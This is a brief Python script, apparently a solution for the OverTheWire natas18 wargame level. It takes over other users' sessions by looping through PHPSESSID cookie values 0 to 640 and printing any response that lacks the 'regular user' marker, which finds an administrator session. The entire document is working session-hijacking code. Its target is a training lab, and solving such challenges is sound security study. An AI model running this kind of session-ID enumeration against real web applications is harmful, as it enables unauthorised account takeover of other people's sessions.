#!/bin/python
import requests
import string

url = "http://natas18.natas.labs.overthewire.org/index.php"
username = "natas18"
password = '' # password for natas18 goes here

for i in range(0,641):
	print("Trying id " + str(i))
	s = requests.Session()
	s.auth = (username, password)

	r = s.get(url, cookies={'PHPSESSID': str(i)})
	hint = 'regular user'
	if not hint in r.text:
		print(r.text)